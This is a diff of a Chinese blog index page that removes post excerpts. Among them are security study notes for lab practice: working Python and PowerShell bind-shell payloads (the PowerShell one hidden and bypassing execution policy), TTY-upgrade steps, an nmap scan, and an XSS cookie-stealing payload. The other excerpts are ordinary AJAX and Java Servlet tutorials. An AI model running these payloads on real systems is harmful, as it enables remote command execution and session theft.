-<p>管道文件在操作系统中以文件的形式存在，但实际上它们并不存储任何数据，而是将数据直接传递给读取它们的进程。<strong>当一个进程写入管道时，数据将被缓存并传递给读取进程，以便进程之间进行通信</strong>。</p>
-<p>管道文件的创建使用特定的命令或系统调用，如在Linux中的<code>mkfifo</code>命令或<code>mkfifo()</code>系统调用。它们可以在命令行中使用，也可以在脚本或程序中以编程方式使用。</p>
-<p>管道文件在进程间通信（IPC）中非常有用，特别是当需要在不同的进程之间传递数据或进行协作时。它们可以用于多个进程之间的实时数据传输、数据处理管道和进程间同步等场景。管道文件提供了一种简单而有效的方式来实现进程之间的通信，而无需使用复杂的进程间通信机制。</p>
-<h3 id="载荷3："><a href="#载荷3：" class="headerlink" title="载荷3："></a>载荷3：</h3><pre><code>python -c &#39;exec(&quot;&quot;&quot;import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((&quot;0.0.0.0&quot;,1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())&quot;&quot;&quot;)&#39;
-</code></pre>
-<p>整理一下：</p>
-<pre><code>python -c &#39;exec(&quot;&quot;&quot;import socket as s,subprocess as sp;
-s1=s.socket(s.AF_INET,s.SOCK_STREAM);
-s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);
-s1.bind((&quot;0.0.0.0&quot;,1234));s1.listen(1);c,a=s1.accept();
-\nwhile True: d=c.recv(1024).decode();
-p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);
-c.sendall(p.stdout.read()+p.stderr.read())&quot;&quot;&quot;)&#39;
-</code></pre>
-<p>chatgpt解释：</p>
-<pre><code>import socket as s, subprocess as sp
-
-# 导入所需的模块，包括 socket 和 subprocess
-
-s1 = s.socket(s.AF_INET, s.SOCK_STREAM)
-# 创建一个 TCP socket 对象
-
-s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)
-# 设置 socket 选项，允许地址复用
-
-s1.bind((&quot;0.0.0.0&quot;, 1234))
-# 将 socket 绑定到本地地址和指定的端口号
-
-s1.listen(1)
-# 开始监听传入的连接请求，参数 1 表示允许的最大连接数为 1
-
-c, a = s1.accept()
-# 接受客户端的连接请求，并返回一个新的 socket 对象和客户端的地址
-
-while True:
-    d = c.recv(1024).decode()
-    # 接收从客户端发送过来的数据（命令），并进行解码
-
-    p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
-    # 使用 subprocess.Popen 创建一个新的子进程，并执行接收到的命令
-
-    c.sendall(p.stdout.read() + p.stderr.read())
-    # 将子进程的标准输出和标准错误输出发送回客户端
-</code></pre>
-<p>这个脚本创建了一个 TCP socket 服务器，监听在本地地址（”0.0.0.0”）的端口号 1234 上。当客户端连接成功后，它将无限循环等待客户端发送的命令。每次接收到命令后，它使用 <code>subprocess.Popen</code> 创建一个新的子进程，并在子进程中执行该命令。然后，脚本将子进程的标准输出和标准错误输出发送回客户端。</p>
-<p> <code> p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)</code>:</p>
-<p>这行代码使用 <code>subprocess.Popen</code> 创建一个新的子进程，并执行从客户端接收到的命令。</p>
-<p>具体解析如下：</p>
-<ul>
-<li><code>d</code> 是从客户端接收到的命令字符串，它将作为子进程要执行的命令。</li>
-<li><code>shell=True</code> 表示要在子进程中使用系统的默认 shell 来解释和执行命令。</li>
-<li><code>stdout=sp.PIPE</code> 指定子进程的标准输出将通过管道进行捕获，以便稍后读取。</li>
-<li><code>stderr=sp.PIPE</code> 指定子进程的标准错误输出也通过管道进行捕获，以便稍后读取。</li>
-<li><code>stdin=sp.PIPE</code> 表示可以通过管道将输入提供给子进程的标准输入。</li>
-</ul>
-<p>综合起来，这行代码的作用是创建一个新的子进程，使用系统的默认 shell 执行从客户端接收到的命令，并通过管道捕获子进程的标准输出、标准错误输出和标准输入。这样，我们可以在主程序中通过管道读取子进程的输出和错误信息，以及将输入发送给子进程。</p>
-<p>通过这种方式，父进程可以与子进程进行双向通信，向子进程发送输入，并获取子进程的输出和错误信息。这在反向 shell 的实现中非常常见，允许远程控制端发送命令给被控制端，并获取执行结果。</p>
-<p>###载荷4：</p>
-<pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close();
-</code></pre>
-<p>这个脚本使用 PowerShell 创建一个反向 shell 服务端，监听在指定的端口号 1234 上，并隐藏其执行过程。</p>
-<p>以下是对每行代码的解析：</p>
-<ul>
-<li><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command</code>: 这是执行 PowerShell 脚本的命令行参数，它设置了一些选项来隐藏 PowerShell 窗口并绕过执行策略。</li>
-<li><code>$listener = [System.Net.Sockets.TcpListener]1234; $listener.start();</code>: 创建一个 <code>TcpListener</code> 对象并将其绑定到本地地址的端口 1234 上，并开始监听传入的连接请求。</li>
-<li><code>$client = $listener.AcceptTcpClient();</code>: 接受客户端的连接请求，并返回一个新的 <code>TcpClient</code> 对象，用于与客户端进行通信。</li>
-<li><code>$stream = $client.GetStream();</code>: 获取与客户端连接的网络流，用于发送和接收数据。</li>
-<li><code>[byte[]]$bytes = 0..65535|%&#123;0&#125;;</code>: 创建一个字节数组，用于存储从客户端接收的数据。</li>
-<li><code>while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)</code>: 进入一个无限循环，不断接收从客户端发送的数据。</li>
-<li><code>$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);</code>: 将接收到的字节数组转换为字符串，以便获取从客户端发送的命令。</li>
-<li><code>$sendback = (iex $data 2&gt;&amp;1 | Out-String );</code>: 执行从客户端接收到的命令，并将输出结果保存到 <code>$sendback</code> 变量中。</li>
-<li><code>$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot; &quot;;</code>: 在输出结果后添加当前 PowerShell 会话的路径信息。</li>
-<li><code>$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);</code>: 将输出结果转换为 ASCII 字节，以便发送给客户端。</li>
-<li><code>$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()</code>: 将字节发送回客户端，并刷新网络流</li>
-</ul>
-<p>##升级 TTY</p>
-<p>通过Netcat连接到shell后，我们会注意到我们只能键入命令或退格键，但我们不能向左或向右移动文本光标来编辑我们的命令，也不能上下访问命令历史记录。为了能够做到这一点，我们需要升级我们的 TTY。这可以通过将我们的终端 TTY 与远程 TTY 映射来实现。</p>
-<p>有多种方法可以做到这一点。出于我们的目的，我们将使用该方法。在我们的 shell 中，我们将使用以下命令使用 python 将我们的 shell 类型升级到完整的 TTY：<code>python/stty``netcat</code></p>
-<p>  升级 TTY</p>
-<pre><code>Tanin@htb[/htb]$ python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
-</code></pre>
-<p>运行此命令后，我们将点击后台我们的 shell 并返回我们的本地终端，并输入以下命令：<code>ctrl+z``stty</code></p>
-<pre><code>www-data@remotehost$ ^Z
-
-Tanin@htb[/htb]$ stty raw -echo
-Tanin@htb[/htb]$ fg
-
-[Enter]
-[Enter]
-www-data@remotehost$
-</code></pre>
-<p>一旦我们击中，它将把我们的外壳带回前台。此时，终端将显示一个空行。我们可以再次点击以返回我们的外壳或输入并按回车键将其带回。此时，我们将拥有一个完全工作的TTY shell，其中包含命令历史记录和其他所有内容。<code>fg``netcat``enter``reset</code></p>
-<p>我们可能会注意到我们的外壳没有覆盖整个终端。为了解决这个问题，我们需要找出一些变量。我们可以在系统上打开另一个终端窗口，最大化窗口或使用我们想要的任何大小，然后输入以下命令来获取我们的变量：</p>
-<pre><code>Tanin@htb[/htb]$ echo $TERM
-
-xterm-256color
-</code></pre>
-<pre><code>Tanin@htb[/htb]$ stty size
-
-67 318
-</code></pre>
-<p>第一个命令向我们显示了变量，第二个命令分别向我们显示了 和 的值。现在我们有了变量，我们可以回到我们的 shell 并使用以下命令来纠正它们：<code>TERM``rows``columns``netcat</code></p>
-<pre><code>www-data@remotehost$ export TERM=xterm-256color
-
-www-data@remotehost$ stty rows 67 columns 318
-</code></pre>
-<p>一旦我们这样做了，我们应该有一个使用终端全部功能的 shell，就像 SSH 连接一样。<code>netcat</code></p>
-
+            
             
         </div>
     </div>
@@ -1088,7 +644,7 @@ www-data@remotehost$ stty rows 67 columns 318
         
         <span class="tag">
             
-            <a href="/tags/base" style=color:#00bcd4>
+            <a href="/tags/base" style=color:#03a9f4>
                 base
             </a>
         </span>
@@ -1123,7 +679,6 @@ www-data@remotehost$ stty rows 67 columns 318
 
     <div class="excerpt">
         <div class="content" v-pre>
-            
             
             <p>当使用 Java Web 技术构建后端，并使用 AJAX 进行前后端交互时，以下是一个简单的示例：</p>
 <p>###前端（使用 AJAX）：</p>
@@ -1160,294 +715,7 @@ www-data@remotehost$ stty rows 67 columns 318
 &lt;/body&gt;
 &lt;/html&gt;
 </code></pre>
-<p>后端（Java Servlet）：</p>
-<pre><code class="java">import java.io.IOException;
-import javax.servlet.ServletException;
-import javax.servlet.http.HttpServlet;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
-import org.json.JSONObject;
-
-public class BackendServlet extends HttpServlet &#123;
-  protected void doGet(HttpServletRequest request, HttpServletResponse response)
-      throws ServletException, IOException &#123;
-    // 处理 GET 请求
-    JSONObject json = new JSONObject();
-    json.put(&quot;message&quot;, &quot;这是从后端返回的数据&quot;);
-
-    response.setContentType(&quot;application/json&quot;);
-    response.setCharacterEncoding(&quot;UTF-8&quot;);
-    response.getWriter().write(json.toString());
-  &#125;
-&#125;
-</code></pre>
-<p>在上面的示例中，前端页面使用 AJAX 发送 GET 请求到名为 <code>backendServlet</code> 的后端 Servlet。后端 Servlet 接收到请求后，构造一个包含 JSON 数据的响应，并将其返回给前端。前端页面接收到响应后，通过 AJAX 回调函数处理响应数据，更新页面上的内容。</p>
-<p>请注意，这只是一个简单的示例，实际应用中可能需要更复杂的处理逻辑和错误处理。另外，你需要将后端 Servlet 配置在服务器上，以便能够通过指定的 URL 访问到它。</p>
-<p>这个示例演示了如何使用 AJAX 和 Java Web 技术进行前后端交互，通过 AJAX 发送请求，后端 Servlet 接收请求并返回响应数据。</p>
-<p>JSON（JavaScript Object Notation）是一种用于数据交换的轻量级文本格式。它以易于阅读和编写的方式表示结构化数据，并且易于解析和生成。JSON数据是基于键值对的集合，其中键和值之间使用冒号（:）分隔，键值对之间使用逗号（,）分隔，整个数据使用花括号（{}）括起来。</p>
-<p>以下是一个简单的 JSON 示例：</p>
-<pre><code class="json">&#123;
-  &quot;name&quot;: &quot;John&quot;,
-  &quot;age&quot;: 30,
-  &quot;city&quot;: &quot;New York&quot;
-&#125;
-</code></pre>
-<p>在上面的示例中，JSON 表示一个包含三个键值对的对象。键是字符串，用双引号括起来，值可以是字符串、数字、布尔值、数组、嵌套的对象或null。</p>
-<p>JSON 提供了一种通用的数据格式，被广泛用于前后端之间的数据交换。在 Web 开发中，常用于前后端之间的数据传输，尤其是在使用 AJAX 进行异步通信时，常用 JSON 格式来传输数据。</p>
-<p>在前端，可以使用 JavaScript 的内置函数 <code>JSON.parse()</code> 将 JSON 字符串解析为 JavaScript 对象，以便对数据进行处理。反之，可以使用 <code>JSON.stringify()</code> 将 JavaScript 对象转换为 JSON 字符串，以便进行传输或存储。</p>
-<p>总结：JSON 是一种用于数据交换的文本格式，以易读易写的方式表示结构化数据。它广泛用于前后端之间的数据交互，并可以通过 JavaScript 的内置函数进行解析和生成。</p>
-<p>如果前端发送的是 POST 请求，你可以在前端的 AJAX 请求中指定请求方法为 “POST”，并将数据作为请求体发送给后端。在后端的 Servlet 中，你需要相应地处理 POST 请求的数据。</p>
-<p>以下是在前端使用 POST 请求发送数据给后端的示例：</p>
-<p>###前端（使用 AJAX 发送 POST 请求）：</p>
-<pre><code class="html">&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;head&gt;
-  &lt;title&gt;AJAX POST 请求示例&lt;/title&gt;
-  &lt;script src=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;&gt;&lt;/script&gt;
-&lt;/head&gt;
-&lt;body&gt;
-  &lt;button id=&quot;sendDataBtn&quot;&gt;发送数据&lt;/button&gt;
-
-  &lt;script&gt;
-    $(document).ready(function() &#123;
-      // 当点击按钮时发送 POST 请求
-      $(&#39;#sendDataBtn&#39;).click(function() &#123;
-        var data = &#123;
-          name: &#39;John&#39;,
-          age: 30
-        &#125;;
-
-        $.ajax(&#123;
-          url: &#39;backendServlet&#39;, // 后端的 Servlet 地址
-          type: &#39;POST&#39;,
-          dataType: &#39;json&#39;,
-          data: JSON.stringify(data), // 将数据转换为 JSON 字符串发送
-          contentType: &#39;application/json&#39;,
-          success: function(response) &#123;
-            // 请求成功时处理响应
-            console.log(response.message);
-          &#125;,
-          error: function() &#123;
-            // 请求失败时显示错误信息
-            console.log(&#39;请求失败&#39;);
-          &#125;
-        &#125;);
-      &#125;);
-    &#125;);
-  &lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<p>后端（Java Servlet 处理 POST 请求）：</p>
-<pre><code class="java">import java.io.BufferedReader;
-import java.io.IOException;
-import javax.servlet.ServletException;
-import javax.servlet.http.HttpServlet;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
-import org.json.JSONObject;
-
-public class BackendServlet extends HttpServlet &#123;
-  protected void doPost(HttpServletRequest request, HttpServletResponse response)
-      throws ServletException, IOException &#123;
-    // 从请求体中读取数据
-    StringBuilder requestBody = new StringBuilder();
-    BufferedReader reader = request.getReader();
-    String line;
-    while ((line = reader.readLine()) != null) &#123;
-      requestBody.append(line);
-    &#125;
-
-    // 解析请求体中的数据
-    JSONObject jsonData = new JSONObject(requestBody.toString());
-    String name = jsonData.getString(&quot;name&quot;);
-    int age = jsonData.getInt(&quot;age&quot;);
-
-    // 处理数据并生成响应
-    JSONObject jsonResponse = new JSONObject();
-    jsonResponse.put(&quot;message&quot;, &quot;接收到的数据：&quot; + name + &quot;, &quot; + age);
-
-    response.setContentType(&quot;application/json&quot;);
-    response.setCharacterEncoding(&quot;UTF-8&quot;);
-    response.getWriter().write(jsonResponse.toString());
-  &#125;
-&#125;
-</code></pre>
-<p>在上面的示例中，前端通过 AJAX 发送 POST 请求到后端的 Servlet。在前端的 AJAX 请求中，我们将请求方法设置为 “POST”，并将数据对象转换为 JSON 字符串后作为请求体发送。在后端的 Servlet 中，我们使用 <code>request.getReader()</code> 方法获取请求体中的数据，并通过 <code>JSONObject</code> 解析和处理数据。然后，我们生成一个包含响应数据的 JSON 对象，并将其作为响应返回给前端。</p>
-<p>需要注意的是，在发送 POST 请求时，要正确设置请求头的 <code>Content-Type</code> 为 <code>&#39;application/json&#39;</code>，以指示请求体的内容类型为 JSON 格式。</p>
-<p>通过以上示例，你可以在前后端之间使用 POST 请求进行数据交互，并在后端的 Servlet 中接收和处理 POST 请求的数据。</p>
-<p>###实时留言板</p>
-<p>要实现一个实时留言板，您可以使用 AJAX 技术与 JavaWeb 后端结合。以下是一个基本的实现示例：</p>
-<ol>
-<li>创建前端页面（例如 <code>index.html</code>）：</li>
-</ol>
-<pre><code class="html">&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;head&gt;
-  &lt;title&gt;实时留言板&lt;/title&gt;
-  &lt;script src=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;&gt;&lt;/script&gt;
-&lt;/head&gt;
-&lt;body&gt;
-  &lt;h1&gt;实时留言板&lt;/h1&gt;
-  &lt;div id=&quot;messageContainer&quot;&gt;&lt;/div&gt;
-
-  &lt;form id=&quot;messageForm&quot;&gt;
-    &lt;input type=&quot;text&quot; id=&quot;nameInput&quot; placeholder=&quot;姓名&quot;&gt;
-    &lt;textarea id=&quot;messageInput&quot; placeholder=&quot;留言&quot;&gt;&lt;/textarea&gt;
-    &lt;button type=&quot;submit&quot;&gt;提交留言&lt;/button&gt;
-  &lt;/form&gt;
-
-  &lt;script&gt;
-    // 定时更新留言
-    setInterval(loadMessages, 5000);
-
-    // 加载留言
-    function loadMessages() &#123;
-      $.ajax(&#123;
-        url: &#39;GetMessagesServlet&#39;, // 后端的 Servlet 地址
-        type: &#39;GET&#39;,
-        dataType: &#39;json&#39;,
-        success: function(data) &#123;
-          // 清空留言容器
-          $(&#39;#messageContainer&#39;).empty();
-
-          // 遍历留言列表并添加到容器中
-          $.each(data, function(index, message) &#123;
-            var messageHtml = &#39;&lt;div&gt;&lt;strong&gt;&#39; + message.name + &#39;:&lt;/strong&gt; &#39; + message.content + &#39;&lt;/div&gt;&#39;;
-            $(&#39;#messageContainer&#39;).append(messageHtml);
-          &#125;);
-        &#125;,
-        error: function() &#123;
-          console.log(&#39;请求失败&#39;);
-        &#125;
-      &#125;);
-    &#125;
-
-    // 提交留言
-    $(&#39;#messageForm&#39;).submit(function(e) &#123;
-      e.preventDefault();
-
-      var name = $(&#39;#nameInput&#39;).val();
-      var content = $(&#39;#messageInput&#39;).val();
-
-      $.ajax(&#123;
-        url: &#39;AddMessageServlet&#39;, // 后端的 Servlet 地址
-        type: &#39;POST&#39;,
-        dataType: &#39;json&#39;,
-        data: &#123; name: name, content: content &#125;,
-        success: function() &#123;
-          // 提交成功后清空输入框并刷新留言
-          $(&#39;#nameInput&#39;).val(&#39;&#39;);
-          $(&#39;#messageInput&#39;).val(&#39;&#39;);
-          loadMessages();
-        &#125;,
-        error: function() &#123;
-          console.log(&#39;提交失败&#39;);
-        &#125;
-      &#125;);
-    &#125;);
-  &lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<ol start="2">
-<li>创建后端 Servlet（例如 <code>GetMessagesServlet</code>）用于获取留言列表：</li>
-</ol>
-<pre><code class="java">@WebServlet(&quot;/GetMessagesServlet&quot;)
-public class GetMessagesServlet extends HttpServlet &#123;
-    protected void doGet(HttpServletRequest request, HttpServletResponse response)
-            throws ServletException, IOException &#123;
-        // 模拟从数据库或其他存储中获取留言列表
-        List&lt;Message&gt; messages = new ArrayList&lt;&gt;();
-        messages.add(new Message(&quot;John&quot;, &quot;Hello&quot;));
-        messages.add(new Message(&quot;Jane&quot;, &quot;Hi there&quot;));
-        
-        // 将留言列表转换为 JSON 格式并发送给前端
-        response.setContentType(&quot;application/json&quot;);
-        response.setCharacterEncoding(&quot;UTF-8&quot;);
-        response.getWriter().write(new Gson().toJson(messages));
-    &#125;
-&#125;
-</code></pre>
-<ol start="3">
-<li>创建后端 Servlet（例如 <code>AddMessageServlet</code>）用于添加留言：</li>
-</ol>
-<pre><code class="java">@WebServlet(&quot;/AddMessageServlet&quot;)
-public class AddMessageServlet extends HttpServlet &#123;
-    protected void doPost(HttpServletRequest request, HttpServletResponse response)
-            throws ServletException, IOException &#123;
-        // 获取前端提交的留言信息
-        String name = request.getParameter(&quot;name
-
-&quot;);
-        String content = request.getParameter(&quot;content&quot;);
-        
-        // TODO: 将留言信息保存到数据库或其他存储中
-        
-        // 返回成功的状态给前端
-        response.setContentType(&quot;application/json&quot;);
-        response.setCharacterEncoding(&quot;UTF-8&quot;);
-        response.getWriter().write(&quot;&#123;\&quot;status\&quot;:\&quot;success\&quot;&#125;&quot;);
-    &#125;
-&#125;
-</code></pre>
-<p>上述示例中，前端页面使用 AJAX 定时请求 <code>GetMessagesServlet</code> 获取留言列表，并通过 <code>AddMessageServlet</code> 提交留言。后端 Servlet 根据业务逻辑获取或保存留言信息，并将留言列表或成功状态返回给前端。</p>
-<p>请注意，上述示例是一个基本的实现框架，您可以根据自己的需求进行适当修改和扩展。例如，可以在后端使用数据库存储留言信息，可以增加用户认证和权限控制等功能。</p>
-<p>###数组</p>
-<p>要在前端依次展示一个数组内的数据内容，并为每个数据应用特定的样式，您可以使用 JavaScript 和 HTML&#x2F;CSS 来实现。以下是一个简单的示例：</p>
-<p>HTML：</p>
-<pre><code class="html">&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;head&gt;
-  &lt;title&gt;展示数组数据&lt;/title&gt;
-  &lt;style&gt;
-    /* 自定义样式 */
-    .item &#123;
-      color: blue;
-      font-weight: bold;
-    &#125;
-  &lt;/style&gt;
-&lt;/head&gt;
-&lt;body&gt;
-  &lt;div id=&quot;container&quot;&gt;&lt;/div&gt;
-
-  &lt;script src=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;&gt;&lt;/script&gt;
-  &lt;script src=&quot;script.js&quot;&gt;&lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<p>JavaScript（script.js）：</p>
-<pre><code class="javascript">$(document).ready(function() &#123;
-  // 定义要展示的数据数组
-  var data = [&quot;Apple&quot;, &quot;Banana&quot;, &quot;Orange&quot;, &quot;Grapes&quot;];
-
-  // 获取容器元素
-  var container = $(&#39;#container&#39;);
-
-  // 遍历数据数组
-  $.each(data, function(index, item) &#123;
-    // 创建元素并添加到容器中
-    var element = $(&#39;&lt;div&gt;&#39;).addClass(&#39;item&#39;).text(item);
-    container.append(element);
-  &#125;);
-&#125;);
-</code></pre>
-<p>上述示例中，我们定义了一个数组 <code>data</code>，其中包含要展示的数据内容。通过遍历数组，并使用 jQuery 动态创建元素，为每个数据项创建一个 <code>&lt;div&gt;</code> 元素，并为其添加自定义样式。最后，将创建的元素添加到容器 <code>#container</code> 中。</p>
-<p>您可以根据自己的需求修改样式和数组数据，以及对创建的元素进行进一步的自定义和处理。</p>
-<p><code>$(&#39;&lt;div&gt;&#39;)</code> 是使用 jQuery 动态创建一个 <code>&lt;div&gt;</code> 元素的语法。<code>addClass(&#39;item&#39;)</code> 是为该元素添加一个 CSS 类名为 <code>&#39;item&#39;</code>，这样可以应用特定的样式。<code>.text(item)</code> 是设置该元素的文本内容为变量 <code>item</code> 的值。</p>
-<p>这行代码的作用是创建一个 <code>&lt;div&gt;</code> 元素，并添加 <code>&#39;item&#39;</code> 类名和 <code>item</code> 的文本内容。这样可以在 HTML 中展示该元素，并应用特定的样式。</p>
-<p><code>$.each(data, function(index, item) &#123; ... &#125;)</code> 是使用 jQuery 的 <code>$.each()</code> 函数对一个数组或对象进行迭代的语法。在这个语法中，<code>data</code> 是要迭代的数组或对象，<code>index</code> 是当前元素的索引，<code>item</code> 是当前元素的值。</p>
-<p>通过这个语法，你可以遍历数组或对象中的每个元素，并在迭代过程中执行特定的操作。你可以在函数体内部编写代码，对每个元素进行处理。</p>
-<p>例如，如果 <code>data</code> 是一个包含多个数据的数组，你可以在函数体内部使用 <code>item</code> 变量来访问每个数据，并对其进行操作，比如创建元素、设置样式、添加到页面等。这样可以实现按照特定样式展示数组中的数据内容。</p>
-<p>示例代码如下：</p>
-<pre><code class="javascript">$.each(data, function(index, item) &#123;
-  var element = $(&#39;&lt;div&gt;&#39;).addClass(&#39;item&#39;).text(item);
-  // 在这里可以对 element 进行进一步的操作，比如设置样式、添加到页面等
-  // ...
-&#125;);
-</code></pre>
-<p>在这个示例中，对于 <code>data</code> 数组中的每个元素，都会创建一个 <code>&lt;div&gt;</code> 元素，并应用 <code>&#39;item&#39;</code> 类名和元素的文本内容为当前元素的值。你可以根据需要在函数体内部对 <code>element</code> 进行进一步的操作。</p>
-
+            
             
         </div>
     </div>
@@ -1461,7 +729,7 @@ public class AddMessageServlet extends HttpServlet &#123;
         
         <span class="tag">
             
-            <a href="/tags/others" style=color:#ff7d73>
+            <a href="/tags/others" style=color:#00bcd4>
                 others
             </a>
         </span>
@@ -1497,7 +765,6 @@ public class AddMessageServlet extends HttpServlet &#123;
     <div class="excerpt">
         <div class="content" v-pre>
             
-            
             <h1 id="杂记"><a href="#杂记" class="headerlink" title="杂记"></a>杂记</h1><p>学习过程中的遇到的一些工具或指令</p>
 <p>###http-enum&#x3D;&#x3D;脚本枚举</p>
 <p>nmap使用&#x3D;&#x3D;http-enum&#x3D;&#x3D;脚本枚举，该脚本可用于枚举常见的 Web 应用程序目录。</p>
@@ -1517,41 +784,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 19.23 seconds
 </code></pre>
-<h3 id="xmllint-美化xml文件的输出"><a href="#xmllint-美化xml文件的输出" class="headerlink" title="xmllint 美化xml文件的输出"></a>xmllint 美化xml文件的输出</h3><pre><code>Tanin@htb[/htb]$ curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint  --format -
-
-&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;
-&lt;users&gt;
-  &lt;user username=&quot;admin&quot;&gt;
-    &lt;id type=&quot;integer&quot;&gt;0&lt;/id&gt;
-    &lt;session_fail_count type=&quot;integer&quot;&gt;2&lt;/session_fail_count&gt;
-    &lt;session_date type=&quot;integer&quot;&gt;1608182184&lt;/session_date&gt;
-  &lt;/user&gt;
-  &lt;blacklist type=&quot;string&quot; ip=&quot;10.10.10.1&quot;&gt;
-    &lt;date type=&quot;integer&quot;&gt;1512964659&lt;/date&gt;
-    &lt;fail_count type=&quot;integer&quot;&gt;1&lt;/fail_count&gt;
-  &lt;/blacklist&gt;
-  &lt;blacklist type=&quot;string&quot; ip=&quot;10.10.14.2&quot;&gt;
-    &lt;date type=&quot;integer&quot;&gt;1608182171&lt;/date&gt;
-    &lt;fail_count type=&quot;integer&quot;&gt;5&lt;/fail_count&gt;
-  &lt;/blacklist&gt;
-&lt;/users&gt;
-</code></pre>
-<p>   在<code>curl</code>命令中，选项<code>-s</code>表示”silent”（静默）或者”silent mode”（静默模式）。它告诉<code>curl</code>不要输出任何进度或错误信息，只返回请求的结果。使用<code>-s</code>选项可以在脚本或命令行中以静默方式使用<code>curl</code>，只获取结果而不打印其他信息。</p>
-<h3 id="提升shell"><a href="#提升shell" class="headerlink" title="提升shell"></a>提升shell</h3><p>python3 -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
-<p>注：根据python版本</p>
-<ul>
-<li><code>python3</code>: 运行 Python 3 解释器。</li>
-<li><code>-c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code>: 使用 <code>-c</code> 参数指定要在命令行中执行的 Python 代码。在这个代码块中，执行了以下操作：<ul>
-<li><code>import pty</code>: 导入 <code>pty</code> 模块，该模块提供了伪终端（pseudo-terminal）的功能。</li>
-<li><code>pty.spawn(&quot;/bin/bash&quot;)</code>: 使用 <code>pty.spawn</code> 函数将当前终端转变为一个交互式的 bash shell。它会将当前进程变成一个子进程，并将子进程的输入和输出连接到一个伪终端，以实现交互式的终端功能。</li>
-</ul>
-</li>
-</ul>
-<p>使用这个脚本，您可以在当前终端创建一个交互式的 bash shell。这对于在一些情况下（例如，当您只能访问一个非交互式 shell）需要获取一个完整的交互式终端会话时非常有用。运行脚本后，您将能够使用 bash 的功能，并与终端进行交互，包括使用命令历史记录、自动补全等。</p>
-<p>###HTML注入</p>
-<pre><code>&lt;img src=/ onerror=alert(document.cookie)&gt;
-</code></pre>
-
+            
             
         </div>
     </div>
@@ -1601,7 +834,6 @@ Nmap done: 1 IP address (1 host up) scanned in 19.23 seconds
     <div class="excerpt">
         <div class="content" v-pre>
             
-            
             <p>###FTP协议：</p>
 <p>下载：<code> apt install ftp -y</code></p>
 <p>使用：<code>ftp -h</code>:</p>
@@ -1609,57 +841,7 @@ Nmap done: 1 IP address (1 host up) scanned in 19.23 seconds
 <p>ftp -h<br>Usage: { ftp | pftp }[-46pinegvtd] [ hostname]<br>-4: use IPv4 addresses only<br>-6: use IPv6，nothing else<br>-p: enable passive mode ( default for pftp)					-i: turn off prompting during mget<br>-n: inhibit auto-login<br>-e: disable readline support，if present-g: disable filename 		 globbing<br>-v: verbose mode<br>-t: enable packet tracing [nonfunctional]           				-d: enable debugging</p>
 </blockquote>
 <p>连接：<code>ftp &#123;target_ip&#125;</code></p>
-<p>​	运行FTP服务的典型错误配置允许匿名帐户像任何其他经过身份验证的用户一样访问该服务。<code>anonymous</code>户名可以在提示符出现时输入，以任何密码作为后缀，因为服务将忽略此特定帐户的密码。</p>
-<p>连接后使用<code>help</code>可以查看可用的命令，用<code>get</code>下载目标文件</p>
-<p>###SMB协议：</p>
-<blockquote>
-<p>SMB是Server Message Block的缩写，是一种用于在计算机之间共享文件、打印机和其他资源的协议。SMB协议最初是由IBM开发的，现在由微软维护。SMB协议可以运行在TCP&#x2F;IP协议上，并支持文件和打印机的共享。在计算机网络中，SMB协议通常用于在不同操作系统之间进行文件共享，如Windows、Linux和Mac OS等。</p>
-</blockquote>
-<p>下载客户端：</p>
-<p><code>apt-get install smbclient</code></p>
-<p>尝试查看可用的域名:</p>
-<p><code>[-L|--list=HOST] : Selecting the targeted host for the connection request.</code></p>
-<p>其中：</p>
